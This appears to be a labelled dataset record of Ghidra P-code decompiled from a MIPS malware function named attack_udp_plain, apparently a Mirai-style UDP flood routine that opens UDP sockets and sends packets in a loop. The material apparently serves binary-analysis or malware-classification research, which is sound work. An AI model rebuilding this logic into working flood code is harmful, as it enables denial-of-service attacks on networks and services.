Label: 53
Function: attack_udp_plain
Architecture: mips
Source File: Unknown
Entry Point: 0040bfa8

High-level P-code:

(register, 0x8, 4) INT_ZEXT (register, 0x13, 1)
(register, 0x8, 4) CALL (ram, 0x400380, 8) , (register, 0x8, 4) , (const, 0x4, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x29, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x29, 4)
(stack, 0xffffffffffffffb0, 1) INDIRECT (stack, 0xffffffffffffffb0, 1) , (const, 0x29, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x29, 4)
(register, 0x8, 4) INT_ZEXT (register, 0x13, 1)
(register, 0x8, 4) CALL (ram, 0x400380, 8) , (register, 0x8, 4) , (const, 0x4, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x36, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x36, 4)
(stack, 0xffffffffffffffb0, 1) INDIRECT (stack, 0xffffffffffffffb0, 1) , (const, 0x36, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x36, 4)
(register, 0x8, 4) CALL (ram, 0x4080fc, 8) , (stack, 0xffffffffffffffa8, 1) , (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffb0, 1) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffa8, 1) SUBPIECE (unique, 0x100000f1, 4) , (const, 0x0, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x48, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x48, 4)
(stack, 0xffffffffffffffb0, 1) INDIRECT (stack, 0xffffffffffffffb0, 1) , (const, 0x48, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x48, 4)
(unique, 0x100000f1, 4) INT_RIGHT (unique, 0x10000101, 4) , (const, 0x18, 4)
(unique, 0x10000101, 4) CAST (stack, 0xffffffffffffffa8, 4)
(register, 0xa, 2) SUBPIECE (register, 0x8, 4) , (const, 0x0, 4)
(register, 0x8, 4) CALL (ram, 0x4080fc, 8) , (stack, 0xffffffffffffffa8, 1) , (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffb0, 1) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffa8, 1) SUBPIECE (unique, 0x100000f5, 4) , (const, 0x0, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x5a, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x5a, 4)
(stack, 0xffffffffffffffb0, 1) INDIRECT (stack, 0xffffffffffffffb0, 1) , (const, 0x5a, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x5a, 4)
(unique, 0x100000f5, 4) INT_RIGHT (unique, 0x10000105, 4) , (const, 0x18, 4)
(unique, 0x10000105, 4) CAST (stack, 0xffffffffffffffa8, 4)
(register, 0xa, 2) SUBPIECE (register, 0x8, 4) , (const, 0x0, 4)
(register, 0x8, 4) CALL (ram, 0x4080fc, 8) , (stack, 0xffffffffffffffa8, 1) , (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffb0, 1) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffa8, 1) SUBPIECE (unique, 0x100000f9, 4) , (const, 0x0, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x6c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x6c, 4)
(stack, 0xffffffffffffffb0, 1) INDIRECT (stack, 0xffffffffffffffb0, 1) , (const, 0x6c, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x6c, 4)
(unique, 0x100000f9, 4) INT_RIGHT (unique, 0x10000109, 4) , (const, 0x18, 4)
(unique, 0x10000109, 4) CAST (stack, 0xffffffffffffffa8, 4)
(register, 0x8, 4) CALL (ram, 0x4080fc, 8) , (stack, 0xffffffffffffffa8, 1) , (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffb0, 1) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffa8, 1) SUBPIECE (unique, 0x100000fd, 4) , (const, 0x0, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x7e, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x7e, 4)
(unique, 0x100000fd, 4) INT_RIGHT (unique, 0x1000010d, 4) , (const, 0x18, 4)
(unique, 0x1000010d, 4) CAST (stack, 0xffffffffffffffa8, 4)
(register, 0xb, 1) SUBPIECE (register, 0x8, 4) , (const, 0x0, 4)
(stack, 0xffffffffffffffdc, 4) PIECE (stack, 0xffffffffffffffdc, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffdc, 2) COPY (const, 0x0, 2)
(stack, 0xffffffffffffffde, 2) COPY (const, 0x0, 2)
(stack, 0xffffffffffffffe0, 4) COPY (const, 0x0, 4)
(stack, 0xffffffffffffffe4, 2) PIECE (stack, 0xffffffffffffffe4, 1) , (stack, 0xffffffffffffffe5, 1)
(stack, 0xffffffffffffffe4, 3) PIECE (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe4, 4) PIECE (stack, 0xffffffffffffffe4, 3) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe4, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffe5, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffe6, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffe7, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffe8, 2) PIECE (stack, 0xffffffffffffffe8, 1) , (stack, 0xffffffffffffffe9, 1)
(stack, 0xffffffffffffffe8, 3) PIECE (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffe8, 4) PIECE (stack, 0xffffffffffffffe8, 3) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffe8, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffe9, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffea, 1) COPY (const, 0x0, 1)
(stack, 0xffffffffffffffeb, 1) COPY (const, 0x0, 1)
(unique, 0x1700, 1) INT_EQUAL (register, 0xa, 2) , (const, 0xffff, 2)
 ---  CBRANCH (ram, 0x40c0bc, 1) , (unique, 0x1700, 1)
(register, 0x8, 4) CALL (ram, 0x40f524, 8)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x9c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x9c, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x9c, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x9c, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x9c, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x9c, 4)
(register, 0xa, 2) SUBPIECE (register, 0x8, 4) , (const, 0x0, 4)
 ---  BRANCH (ram, 0x40c0d4, 1)
(register, 0xa, 2) CALL (ram, 0x4222a8, 8) , (register, 0xa, 2)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffc0, 4) COPY (const, 0x0, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffc4, 2) MULTIEQUAL (register, 0xa, 2) , (register, 0xa, 2)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
 ---  BRANCH (ram, 0x40c384, 1)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
(unique, 0x10000131, 4) INT_ADD (unique, 0x1000012d, 4) , (register, 0x8, 4)
(unique, 0x1000012d, 4) CAST (register, 0x8, 4)
(register, 0x40, 4) CAST (unique, 0x10000131, 4)
(register, 0x8, 4) CALL (ram, 0x400380, 8) , (const, 0xffff, 4) , (const, 0x1, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x11e, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x11e, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x11e, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x11e, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x11e, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x11e, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x40, 4) , (register, 0x8, 4)
(unique, 0x1700, 1) INT_EQUAL (register, 0xa, 2) , (const, 0xffff, 2)
 ---  CBRANCH (ram, 0x40c160, 1) , (unique, 0x1700, 1)
(register, 0x8, 4) CALL (ram, 0x40f524, 8)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x12c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x12c, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x12c, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x12c, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x12c, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x12c, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(register, 0x8, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(unique, 0x10000139, 4) INT_ADD (register, 0x8, 4) , (const, 0x2, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100, 4) , (unique, 0x100000ca, 2)
(unique, 0x100000ca, 2) SUBPIECE (register, 0x8, 4) , (const, 0x0, 4)
(unique, 0x100, 4) CAST (unique, 0x10000139, 4)
 ---  BRANCH (ram, 0x40c1a0, 1)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(register, 0x40, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(register, 0xa, 2) CALL (ram, 0x4222a8, 8) , (register, 0xa, 2)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x22e, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x22e, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x22e, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x22e, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x22e, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x22e, 4)
(unique, 0x10000135, 4) INT_ADD (register, 0x40, 4) , (const, 0x2, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100, 4) , (register, 0xa, 2)
(unique, 0x100, 4) CAST (unique, 0x10000135, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
(unique, 0x10000141, 4) INT_ADD (unique, 0x1000013d, 4) , (register, 0x8, 4)
(unique, 0x1000013d, 4) CAST (register, 0x8, 4)
(register, 0x40, 4) CAST (unique, 0x10000141, 4)
(register, 0x8, 4) CALL (ram, 0x400350, 8) , (const, 0x2, 4) , (const, 0x1, 4) , (const, 0x11, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x150, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x150, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x150, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x150, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x150, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x150, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x40, 4) , (register, 0x8, 4)
(register, 0xc, 4) LOAD (const, 0x1a1, 4) , (register, 0x40, 4)
(unique, 0x1200, 1) INT_EQUAL (register, 0xc, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x40c45c, 1) , (unique, 0x1200, 1)
(stack, 0xffffffffffffffdc, 4) PIECE (stack, 0xffffffffffffffdc, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffdc, 2) COPY (const, 0x2, 2)
(stack, 0xffffffffffffffde, 2) COPY (stack, 0xffffffffffffffc4, 2)
(stack, 0xffffffffffffffe0, 4) COPY (const, 0x0, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
(unique, 0x10000149, 4) INT_ADD (unique, 0x10000145, 4) , (register, 0x8, 4)
(unique, 0x10000145, 4) CAST (register, 0x8, 4)
(register, 0x8, 4) CAST (unique, 0x10000149, 4)
(register, 0x8, 4) LOAD (const, 0x1a1, 4) , (register, 0x8, 4)
(register, 0xc, 4) PTRSUB (register, 0x74, 4) , (const, 0xffffffdc, 4)
 ---  CALL (ram, 0x4003a0, 8) , (register, 0x8, 4) , (unique, 0x1000014d, 4) , (const, 0x10, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x181, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x181, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x181, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x181, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x181, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x181, 4)
(unique, 0x1000014d, 4) CAST (register, 0xc, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(register, 0x8, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(unique, 0x10000151, 4) INT_ADD (register, 0x8, 4) , (const, 0x14, 4)
(unique, 0x2f00, 1) LOAD (const, 0x1a1, 4) , (unique, 0x100, 4)
(unique, 0x100, 4) CAST (unique, 0x10000151, 4)
(unique, 0x5280, 1) INT_LESS (unique, 0x2f00, 1) , (const, 0x20, 1)
 ---  CBRANCH (ram, 0x40c320, 1) , (unique, 0x5280, 1)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(register, 0x8, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(unique, 0x10000155, 4) INT_ADD (register, 0x8, 4) , (const, 0x10, 4)
(register, 0x8, 4) LOAD (const, 0x1a1, 4) , (unique, 0x100, 4)
(unique, 0x100, 4) CAST (unique, 0x10000155, 4)
(register, 0x8, 4) CALL (ram, 0x422288, 8) , (register, 0x8, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x1ad, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x1ad, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x1ad, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x1ad, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x1ad, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x1ad, 4)
(register, 0x8, 4) CALL (ram, 0x40f524, 8)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x1b0, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x1b0, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x1b0, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x1b0, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x1b0, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x1b0, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(register, 0x8, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(unique, 0x10000159, 4) INT_ADD (register, 0x8, 4) , (const, 0x14, 4)
(unique, 0x2f00, 1) LOAD (const, 0x1a1, 4) , (unique, 0x100, 4)
(register, 0x8, 4) INT_ZEXT (unique, 0x2f00, 1)
(unique, 0x100, 4) CAST (unique, 0x10000159, 4)
(unique, 0x5780, 4) INT_AND (register, 0x8, 4) , (const, 0x1f, 4)
(register, 0x8, 4) INT_RIGHT (register, 0x8, 4) , (unique, 0x5780, 4)
(register, 0x10, 4) INT_ADD (register, 0x8, 4) , (register, 0x8, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(register, 0x40, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(register, 0x8, 4) CALL (ram, 0x422288, 8) , (register, 0x10, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x1d7, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x1d7, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x1d7, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x1d7, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x1d7, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x1d7, 4)
(unique, 0x1000015d, 4) INT_ADD (register, 0x40, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100, 4) , (register, 0x8, 4)
(unique, 0x100, 4) CAST (unique, 0x1000015d, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
(unique, 0x10000165, 4) INT_ADD (unique, 0x10000161, 4) , (register, 0x8, 4)
(unique, 0x10000161, 4) CAST (register, 0x8, 4)
(register, 0x8, 4) CAST (unique, 0x10000165, 4)
(register, 0x10, 4) LOAD (const, 0x1a1, 4) , (register, 0x8, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x18, 4)
(unique, 0x10000169, 4) INT_ADD (register, 0x14, 4) , (register, 0x8, 4)
(register, 0x8, 4) CAST (unique, 0x10000169, 4)
 ---  CALL (ram, 0x421988, 8) , (register, 0x10, 4) , (register, 0x8, 4) , (const, 0x10, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x1fb, 4)
(register, 0x8, 4) INT_ADD (stack, 0xffffffffffffffc0, 4) , (const, 0x1, 4)
(register, 0x8, 4) INT_ZEXT (register, 0x13, 1)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (register, 0x8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(unique, 0x5080, 1) INT_SLESSEQUAL (unique, 0x10000111, 4) , (stack, 0xffffffffffffffc0, 4)
(unique, 0x10000111, 4) CAST (register, 0x8, 4)
 ---  CBRANCH (ram, 0x40c0e0, 1) , (unique, 0x5080, 1)
(stack, 0xffffffffffffffc0, 4) COPY (const, 0x0, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
 ---  BRANCH (ram, 0x40c43c, 1)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
(unique, 0x1000011d, 4) INT_ADD (unique, 0x10000119, 4) , (register, 0x8, 4)
(unique, 0x10000119, 4) CAST (register, 0x8, 4)
(register, 0x8, 4) CAST (unique, 0x1000011d, 4)
(register, 0x8, 4) LOAD (const, 0x1a1, 4) , (register, 0x8, 4)
(unique, 0x1200, 1) INT_NOTEQUAL (register, 0xb, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x40c3f4, 1) , (unique, 0x1200, 1)
 ---  CALL (ram, 0x40f608, 8) , (stack, 0xffffffffffffffa8, 4) , (unique, 0x10000121, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xeb, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0xeb, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0xeb, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0xeb, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xeb, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0xeb, 4)
(unique, 0x10000121, 4) CAST (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(register, 0x8, 4) INT_MULT (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
(unique, 0x10000129, 4) INT_ADD (unique, 0x10000125, 4) , (register, 0x8, 4)
(unique, 0x10000125, 4) CAST (register, 0x8, 4)
(register, 0x8, 4) CAST (unique, 0x10000129, 4)
(register, 0x8, 4) LOAD (const, 0x1a1, 4) , (register, 0x8, 4)
